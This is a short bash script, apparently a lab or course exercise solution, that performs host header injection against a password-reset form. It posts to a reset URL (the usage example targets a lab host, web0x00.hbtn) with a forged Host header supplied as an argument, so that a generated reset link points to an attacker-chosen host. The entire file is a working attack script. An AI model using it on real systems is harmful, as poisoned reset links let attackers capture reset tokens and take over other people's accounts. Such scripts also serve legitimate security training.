#!/bin/bash
# Usage:
# ./1-hostheaderinjection.sh newhost http://web0x00.hbtn/reset_password "email=test@test.hbtn"

curl -s -X POST "$2" \
  -H "Host: $1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "$3"
